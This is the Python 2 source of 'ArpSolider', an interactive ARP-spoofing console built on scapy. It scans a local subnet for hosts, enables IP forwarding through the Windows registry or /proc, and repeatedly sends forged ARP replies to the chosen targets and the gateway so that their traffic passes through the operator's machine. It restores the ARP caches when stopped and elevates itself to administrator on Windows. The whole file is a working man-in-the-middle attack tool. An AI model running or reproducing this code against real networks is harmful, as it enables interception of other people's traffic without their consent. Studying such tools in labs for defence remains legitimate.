#!/usr/bin/env python2
import sys
import threading
import time
from scapy.all import *
import os
import socket
try:
    import pwd
except ImportError:
    pass
import shlex
import colorama
import struct
if os.name=="nt":
    import subprocess
    import ctypes
IP = CMD = 0
MAC = TARGET = 1

try:
    import winreg
    class creg:
        registry_dir = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        service_name = "RemoteAccess"
        def __init__(self):
            self.key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters', 0, winreg.KEY_ALL_ACCESS)
        def Service(self,state=True,service_name="RemoteAccess"):
            args = ["sc","start" if state else "stop",service_name]
            pipe = subprocess.Popen(args,shell=True,stdout=subprocess.PIPE)
            pipe.wait()
            result = "".join(pipe.stdout.readlines())
            return (result.find("START_PENDING") > -1 or result.find("FAILED 1056") > -1) if state else (result.find("STOP_PENDING") > -1 or result.find("FAILED 1062") > -1)
        def Check(self):
            try:
                self.key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters', 0, winreg.KEY_ALL_ACCESS)
                winreg.QueryValueEx(self.key, "IPEnableRouter")[0]
                return True
            except:
                return False                
        def GetValue(self):
            try:
                return winreg.QueryValueEx(self.key, "IPEnableRouter")[0]
            except:
                return None
        def SetValue(self,value=0):
            try:
                winreg.SetValueEx(self.key,"IPEnableRouter",0,winreg.REG_DWORD,value)
                self.Service(True if value == 1 else False,self.service_name)
                if(self.GetValue() == value):
                    return True
                return False
            except:
                return False
except ImportError:
    pass
if os.name =="nt":
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
else:
    def is_admin():
        return True
colorama.init()
def getMode(mode):
    if mode == "ok":
        return "%s[*]%s"%(colorama.Fore.BLUE,colorama.Fore.RESET)
    elif mode == "ask" or mode == "warn":
        return "%s[%s]%s"%(colorama.Fore.YELLOW,"*" if mode == "warn" else "?",colorama.Fore.RESET)
    elif mode == "error":
        return "%s[!]%s"%(colorama.Fore.RED,colorama.Fore.RESET)
    elif mode in ["success"]:
        return "%s[*]%s"%(colorama.Fore.GREEN,colorama.Fore.RESET)
def searchAndGetInterface(iname):
    ifaces = NetworkInterfaceDict()
    for i in ifaces.data.keys():
        iface = ifaces.data[i]
        wname = iface.data['netid']
        if(wname == iname):
            return iface
    return selectInterface()
def selectInterface():
    selections = {}
    print("-1 > exit")
    for i,s in zip(ifaces.data.keys(),xrange(len(ifaces.data.keys()))):
        iface = ifaces.data[i]
        wname = iface.data['netid']
        selections[s] = iface
        print("%s > %s : %s"%(s,wname,get_if_addr(iface)))
    try:
        s_ = int(input("Select interface > "))
        if s_ == -1: sys.exit()
        return selections[s_]
    except KeyboardInterrupt:
        return selectInterface()
lt = time.time()
lt_ = 0.05
def getLoader(color=colorama.Fore.YELLOW):
    global lt,lt_
    i =int((time.time()-lt)/lt_)
    ps = ["|","/","-","\\","|","/","-","\\","|"]
    i %= len(ps)
    return "%s[%s]%s"%(
        color,
        ps[i] if i < len(ps) else "|",
        colorama.Fore.RESET
    )
def printf(values, mode="ok",s="",end="\n"):
    print "%s%s%s%s"%(s,getMode(mode),values,end),
def get_username():
    try:
        return pwd.getpwuid( os.getuid() )[ 0 ]
    except:
        if("USERNAME" in os.environ):
            return os.environ["USERNAME"]
        else:
            return "group"
class ArpHandler:
    ip_forward_dir = "/proc/sys/net/ipv4/ip_forward"
    def __init__(self,interface="eth0"):
        self.interface = interface
        if(os.name == "nt"):
            try:
                self.creg = creg()
            except WindowsError:
                if(is_admin()):
                    printf("IP Forwarding couldn't be handled.",mode="error")
                else:
                    printf("Program hasn't started as administrator. IP Forwarding couldn't be handled.",mode="error")
                    ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
                    sys.exit()
                    exit()
    def checkForwader(self):
        try:
            if(os.name == "posix"):
                with open(self.ip_forward_dir,"r") as fp:
                    value = bool(int(fp.read(1)))
                    return True
            elif(os.name == "nt"):
                return self.creg.Check()
        except:
            return False
    def isForwarderOpen(self):
        try:
            if(os.name=="posix"):
                with open(self.ip_forward_dir,"r") as fp:
                    value = bool(int(fp.read(1)))
                    return value
            elif(os.name == "nt"):
                v = self.creg.GetValue()
                return v==1
        except:
            return False
    def setForwading(self,value=False):
        try:
            if(os.name == "posix"):
                if(value):
                    v=True
                    with open(self.ip_forward_dir,"w") as fp:
                        fp.write("1" if v else "0")
                    return self.isForwarderOpen()
                else:
                    v=False
                    with open(self.ip_forward_dir,"w") as fp:
                        fp.write("1" if v else "0")
                    return not self.isForwarderOpen()
            elif(os.name == "nt"):
                if(value):
                    self.creg.SetValue(1)
                    return self.isForwarderOpen()
                else:
                    self.creg.SetValue(0)
                    return not self.isForwarderOpen()
        except:
            return False
    def restoreArpCaches(self,target, gateway, verbose=True):
        # send correct ARP responses to the targets and the gateway
        for i in xrange(3):
            self.sendArp(target[IP], target[MAC], gateway[IP], gateway[MAC])
            self.sendArp(gateway[IP], gateway[MAC], target[IP], target[MAC])
            time.sleep(1)
    def sendArp(self,dst_ip,dst_mac,src_ip,src_mac):
        arp_packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
                     psrc=src_ip, hwsrc=src_mac)
        send(arp_packet, verbose=0)
    def getMAC(self,targetIP):
        source_IP = get_if_addr(self.interface)
        source_MAC = get_if_hwaddr(self.interface)
        p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
        p.hwdst = 'ff:ff:ff:ff:ff:ff'
        p.pdst = targetIP
        reply, unans = sr(p, timeout=5, verbose=0)
        if len(unans) > 0:
            return None
        return reply[0][1].hwsrc
class ArpSpooferConsole:
    def __init__(self):
        self.cwd = get_username()
        self.Done = False
        self.Interface  = searchAndGetInterface("eth0" if os.name == "posix" else "Ethernet")
        self.Timeout = 5
        try:
            self.arpHandler = ArpHandler(self.Interface)
            self.m_host = get_if_addr(self.Interface)
            self.m_mac = self.arpHandler.getMAC(self.m_host)
        except:
            self.Interface = selectInterface()
            self.arpHandler = ArpHandler(self.Interface)
            self.m_host = get_if_addr(self.Interface)
            self.m_mac = self.arpHandler.getMAC(self.m_host)
        # try:
        #     mhost = get_if_addr(self.Interface)
        #     if(mhost):
        #         self.m_host =mhost
        #     else:
        #         self.Interface = raw_input("Please Enter Interface :")
        #         try:
        #             mhost = get_if_addr(self.Interface)
        #         except:
        #             print("Next time enter correctly")
        #             sys.exit(0)
        # except:
        #     self.Interface = raw_input("Please Enter Interface :")
        #     try:
        #             mhost = get_if_addr(self.Interface)
        #     except:
        #             print("Next time enter correctly")
        #             sys.exit(0)
        self.Targets = [

        ]
        self.Restores = [

        ]
        self.commands = {
            "exit":self.Exit,
            "show":self.Show,
            "set":self.Set,
            "scan":self.Scan,
            "add":self.Add,
            "start":self.Start,
            "stop":self.Stop,
            "monitor":self.Monitor,
            "remove":self.Remove
        }
        self.InptStr = "%s%s@%s%s:"%(colorama.Fore.RED,self.cwd,self.m_host,colorama.Fore.RESET)
        self.gateway = ["",""]
        #Variables
        self.AtThread = False
        self.SThread = 0
        self.AThread = 0
        self.RThread = 0
        self.CThread = 0
        self.result = []
    def Stop(self,args=[]):
        self.AtThread=False
        printf("Stopping ARP Spoof.",mode="warn")
    def Remove(self,args=[]):
        if(len(args) < 2):
            print("Missing Arguments")
            return
        if(args[0] in ["target","tgt"]):
            tgt_ip = args[1]
            for target in self.Targets:
                if target[IP] == tgt_ip:
                    self.Targets.remove(target)
                    printf("%s Removed to targets"%(tgt_ip))
                    if(self.AtThread):self.Restores.append(target)
    def Start(self,args=[]):
        if(len(args) < 1):
            print("Usage : start <route-ip>")
            return
        routeip = args[0]
        if(self.isIp(routeip)):
            mac = self.checkIpWithARP(routeip)
            if(mac):
                self.gateway = (routeip,mac)
                printf("Starting with [%s]%s"%(mac,routeip),mode="success")
                if(not self.AtThread):
                    threading.Thread(
                        target=self.arpAttackerThread
                    ).start()
                    printf("Successfully started",mode="success")
                else:
                    printf("Attacker already started",mode="warn")
            else:
                print("Unavailable route-ip")
        else:
            print("Unavailable ip")
    def Add(self,args=[]):
        if(len(args) < 2):
            print("Missing Arguments")
            return
        if(args[0] in ["target","tgt"]):
            tgt_ip = args[1]
            if(self.isIp(tgt_ip)):
                printf("%s Checking..."%(tgt_ip))
                mac = self.checkIpWithARP(tgt_ip)
                if(mac):
                    printf("[%s] %s added to target list"%(mac,tgt_ip),mode="error")
                    self.Targets.append((tgt_ip,mac))
                else:
                    printf("Connection unavaliabe to %s"%(tgt_ip),mode="warn")
            else:
                print("IP is not valid")

    def Exit(self,args=[]):
        if(self.arpHandler.setForwading(False)):
            print("%sIP Forwarding toggled off%s"%(colorama.Fore.GREEN,colorama.Fore.RESET))
        self.Done=True
    def isIp(self,ip):
        try:
            return len(ip.split(".")) == 4 and not False in [0 <= int(i) and 255 > int(i) for i in ip.split(".")]
        except:
            return False
    def checkIpWithARP(self,ip):
        mac = self.arpHandler.getMAC(ip)
        if(mac):
            return mac
        else:
            return None
    def arpCheckerThread(self,ip):
        self.RThread+=1
        self.SThread+=1
        mac = self.checkIpWithARP(ip)
        if(mac):
            self.result.append((ip,mac))
        self.RThread-=1
        self.CThread+=1
    def arpAttackerThread(self):
        self.AtThread=True
        tdevices = self.Targets
        while not self.Done and self.AtThread:
            for target in tdevices:
                self.arpHandler.sendArp(target[IP],target[MAC],self.gateway[IP],self.m_mac)
                self.arpHandler.sendArp(self.gateway[IP],self.gateway[MAC],target[IP],self.m_mac)
            time.sleep(1)
            for t in self.Restores:
                print("")
                try:
                    printf("[%s]%s Restoring..."%(t[MAC],t[IP]))
                    self.arpHandler.restoreArpCaches(t,self.gateway)
                    printf("[%s]%s Restored..."%(t[MAC],t[IP]),mode="success")
                    self.Restores.remove(t)
                except:
                    printf("[%s]%s Restore failed..."%(t[MAC],t[IP]),mode="error")
                print self.InptStr,
            #for t in tdevices:
            #    if(not t in self.Targets):
            #        tdevices.remove(t)
            #        printf("[%s]%s Restoring..."%(t[MAC],t[IP]),mode="success")
            #        self.arpHandler.restoreArpCaches(t,self.gateway)
            for t in self.Targets:
                if(not t in tdevices):
                    tdevices.append(t)
        for device in tdevices:
            self.arpHandler.restoreArpCaches(device,self.gateway)
        printf("Restored all targets",mode="success")
        self.AtThread=False
    def Scan(self,args=[]):
        if(len(args) < 1):
            print("Missing Argument")
            print("Usage: scan 192.168.1.1 | scan <route ip>")
            return
        routeIp  = args[0]
        if(self.isIp(routeIp)):
            mask_ip = ".".join(routeIp.split(".")[:3]+["0"])
            broadcast_ip = ".".join(routeIp.split(".")[:3]+["255"])
            self.CThread = 0
            route_mac = self.checkIpWithARP(routeIp)
            exceptions = [
                mask_ip,
                broadcast_ip,
                self.m_host,
                routeIp
            ]+[i[1] for i in self.Targets]
            self.RThread = 0
            self.GThread = 255-len(exceptions)
            if(route_mac):
                thread_list = []
                thread_stack = []
                printf("Scanning %s[%s] devices"%(routeIp,route_mac),mode="success")
                for i in range(0,255):
                    target_ip = ".".join(routeIp.split(".")[:3]+[str(i)])
                    if(not target_ip in exceptions):
                        th=threading.Thread(
                            target=self.arpCheckerThread,
                            args=(target_ip,)
                        )
                        thread_list.append(th)
                        thread_stack.append((th,target_ip))
#                        print "%s Sending Threads to %s  \r"%(getLoader(),target_ip),
                #printf("%s Sent Threads."%(self.RThread),mode="success")
                printf("Starting and Listening..")
                pdevices = []
                # dt = self.CThread
                # stime = time.time()
                while self.CThread != self.GThread:
                    # if(self.CThread != dt or self.SThread != self.AThread):
                    #     dt=self.CThread
                    #     stime=time.time()
                    if len(thread_stack) > 0:
                        thread_stack[0][0].start()
                        thread_stack.remove(thread_stack[0])
                    for result in self.result:
                        if(not result in pdevices):
                            pdevices.append(result)
                            printf("[%s] %s is online.             "%(result[1],result[0]),mode="success",s="\r")
                    print "\r%s %.2f%s [%s%s] %s Active .    \r"%(getLoader(),100.*self.CThread/self.GThread,"%","#"*(10*self.CThread/self.GThread)," "*(10-10*self.CThread/self.GThread),len(self.result)),
                    sys.stdout.flush()
                    time.sleep(.05)
                if(len(args) == 2):
                    if(args[1] in ["targets","tgts"]):
                        for device in pdevices:
                            if(not device in self.Targets):
                                printf("[%s] %s added to target list."%(device[1],device[0]),mode="success",s="\r")
                                self.Targets.append(device)
                # if(time.time()-stime >= self.Timeout):
                #     printf("Timeout exceeded",mode="warn")
                #     printf("Killing other threads",mode="error")
                #     ic = 0
                #     for thread in thread_list:
                #         if(thread.is_alive()):
                #             ic+=1
                #     printf("%s Threads alive"%(ic),mode="warn")
            print("")
    def Show(self,args=[]):
        if(len(args) < 1):
            print("Missing Argumnets")
            return
        variable = args[0]
        if(variable in ["interface","if"]):
            print("Interface = %s"%(self.Interface))
        elif(variable in ["targets","tgts"]):
            print("IP             \tMAC")
            if(len(self.Targets) == 0): print("Target Not Found")
            for device in self.Targets:
                print("%s\t%s"%(device[0],device[1]))
        elif(variable in ["timeout","tout"]):
            print("Timeout = %s"%(self.Timeout))
        elif(variable in ["variables","vars"]):
            print("%sVariable Name\tValue%s  "%(colorama.Fore.YELLOW,colorama.Fore.RESET))
            print("Interface    \t%s%s%s"%(colorama.Fore.BLUE,self.Interface,colorama.Fore.RESET))
            print("Timeout      \t%s%s%s"%(colorama.Fore.BLUE,self.Timeout,colorama.Fore.RESET))
            print("Targets      \t%s%s Targets%s"%(colorama.Fore.BLUE,len(self.Targets),colorama.Fore.RESET))
        elif(variable in ["stats","status"]):
            if(self.AtThread):
                print("IP             \tMAC             \tStatus")
                if(len(self.Targets) == 0):print("Target not found.")
                for target in self.Targets:
                    print("%s\t%s\t %sWorking%s"%(target[0],target[1],colorama.Fore.GREEN,colorama.Fore.RESET))
            else:
                printf("Attacker hasn't started",mode="warn")
    def Set(self,args=[]):
        if(len(args) < 2):
            print("Missing Argumnets")
            return
        variable = args[0]
        if(variable in ["interface","if"]):
            value = searchAndGetInterface(args[1])
            if(not type(value) in [str,type(None)]):
                vmname = value.data['netid']
                print("%s assigned as %s"%(self.Interface,vmname))
            else:
                print("%s assigned as %s"%(self.Interface,value))
            self.Interface = value
            self.arpHandler.interface = self.Interface
        elif(variable in ["timeout","tout"]):
            try:
                value = float(args[1])
            except:
                print("Please enter correct value")
                return
            print("%s assigned as %s"%(self.Timeout,value))
            self.Timeout = value
    def Monitor(self):
        pass
    def run(self):
        print("ArpSolider")
        print("Name : Ege Ismail")
        print("Author : Septillioner")
        print("Email : septillioner@protonmail.com")
        if(self.arpHandler.checkForwader()):
            print("%sIP Forwarding could handled%s"%(colorama.Fore.GREEN,colorama.Fore.RESET))
            if(self.arpHandler.isForwarderOpen()):
                print("%sIP Forwarding toggled on%s"%(colorama.Fore.GREEN,colorama.Fore.RESET))
            else:
                print("%sIP Forwarding toggling on%s"%(colorama.Fore.YELLOW,colorama.Fore.RESET))
                if(self.arpHandler.setForwading(True)):
                    print("%sIP Forwarding toggled on%s"%(colorama.Fore.GREEN,colorama.Fore.RESET))
                else:
                    print("%sIP Forwarding couldn't handled please active manually%s"%(colorama.Fore.RED,colorama.Fore.RESET))   
        else:
            print("%sIP Forwarding couldn't handled please active manually%s"%(colorama.Fore.RED,colorama.Fore.RESET))
        while not self.Done:
            try:
                parsed_cmd = shlex.split(raw_input("%s%s@%s%s:"%(colorama.Fore.RED,self.cwd,self.m_host,colorama.Fore.RESET)))
            except KeyboardInterrupt:
                print("")
                self.Exit()
                break
            cmd = parsed_cmd[0].lower() if len(parsed_cmd) > 0 else ""
            args = parsed_cmd[1:] if len(parsed_cmd) > 1 else []
            if(cmd in self.commands and callable(self.commands[cmd])):
                try:
                    self.commands[cmd](args)
                except KeyboardInterrupt:
                    print()
                    printf("%s Interrupted."%(cmd),mode="error")
            else:
                if(cmd is not ""):
                    print("%s Command Not Found"%(cmd))
def main():
    acs = ArpSpooferConsole()
    acs.run()
if __name__ == '__main__':
    main()
